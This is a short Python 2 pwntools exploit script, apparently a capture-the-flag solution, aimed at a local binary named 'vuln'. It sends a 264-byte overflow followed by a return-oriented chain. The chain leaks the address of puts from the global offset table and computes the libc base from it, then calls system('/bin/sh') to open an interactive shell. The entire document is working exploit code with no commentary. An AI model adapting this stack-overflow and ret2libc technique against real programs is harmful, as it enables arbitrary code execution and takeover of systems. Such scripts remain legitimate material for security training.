from pwn import *

e = ELF('./vuln')
p = process('./vuln')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc6_2.30-0ubuntu2_amd64.so')

ret_addr = 0x0040101a
pop_rdi_addr = 0x00401223

payload = 'A'*264
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(e.got['puts'])
payload += p64(e.symbols['puts'])
payload += p64(e.symbols['_start'])

print p.recvuntil('echo back>')
p.sendline(payload)
print p.recvline()
print p.recvline()
ret = u64(p.recvline()[:6] + '\x00\x00')
print "ret: " + hex(ret)

## Address Leak
libc_base_addr = ret - libc.symbols['puts']
system_addr = libc.symbols['system'] + libc_base_addr
binsh_addr = next(libc.search("/bin/sh")) + libc_base_addr

payload = 'A'*264
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

print p.recvuntil('echo back>')
p.sendline(payload)
print p.recvline()
print p.recvline()
p.interactive()